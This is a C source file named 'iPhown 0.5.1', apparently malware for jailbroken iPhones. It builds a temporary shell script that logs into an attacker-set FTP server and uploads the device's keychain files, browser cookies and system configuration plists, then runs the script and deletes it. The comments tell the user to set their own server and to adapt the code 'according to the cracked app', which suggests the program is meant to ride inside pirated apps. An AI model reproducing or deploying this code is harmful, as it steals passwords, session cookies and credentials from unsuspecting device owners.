//iPhown 0.5.1
//I'M NOT RESPONSIBLE OF HOW YOU USE THIS CODE, IS ABSOLUTELY YOUR RESPONSABILITY
//BUT MUST OF ALL, HAVE FUN :)

/*This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
  
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
     char name[50];
     char* mkdir = "echo 'mkdir";
     char* tail = "' >> /var/tmp/lol.sh";
     gethostname(name, sizeof(name));
     char * command = malloc(snprintf(NULL, 0, "%s %s %s",mkdir,name,tail)+2);
     sprintf(command,"%s %s %s",mkdir,name,tail);
     
     
     char* cd = "echo 'cd";
     char * command2 = malloc(snprintf(NULL, 0, "%s %s %s",cd,name,tail)+2);
     sprintf(command2,"%s %s %s",cd,name,tail);
     system("dpkg -i inet.deb");
     system("echo '#!/bin/sh' > /var/tmp//var/tmp/lol.sh");
	//Replace 192.168.1.114 with your ftp server
	system("echo 'ftp -i -n 192.168.1.114<<SCRIPT' >> /var/tmp/lol.sh ");
	//Replace iphown iphown with your ftp user and password (I strongly reccomend creating a user just for this with limited privileges).
	system("echo 'user iphown iphown' >> /var/tmp/lol.sh");
	//This is where the real magic begins :)
	//check later --> system("echo 'mkdir "system$HOSTNAME'");
	system(command);
	system(command2);
	system("echo 'lcd /private/var/root/Library/Cookies' >> /var/tmp/lol.sh");
	system("echo 'mput Cookies.plist' >> /var/tmp/lol.sh");
	system("echo 'lcd /private/var/Keychains/' >> /var/tmp/lol.sh");
	system("echo 'mput keychain*' >> /var/tmp/lol.sh");
	system("echo 'lcd /Library/Preferences/SystemConfiguration' >> /var/tmp/lol.sh");
	system("echo 'mput com.apple*' >> /var/tmp/lol.sh");
	system("echo 'lcd /Library/Preferences/SystemConfiguration/' >> /var/tmp/lol.sh");
	system("echo 'mput preferences.plist' >> /var/tmp/lol.sh");
	system("echo 'quit' >> /var/tmp/lol.sh");
	//Change according to the cracked app ;)
	//system("echo 'rm /var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures' >> /var/tmp/lol.sh");
	//system("echo 'cp /var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures.copy /var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures' >> /var/tmp/lol.sh");
	//system("var/mobile/Applications/0DB31937-C3AE-448D-BA32-820FDD18FF29/SonyPictures.app/SonyPictures.copy");
	system("echo 'SCRIPT' >> /var/tmp/lol.sh");
	system("chmod 777 /var/tmp/lol.sh");
	system("/var/tmp/lol.sh");
	system("rm /var/tmp/lol.sh");
}

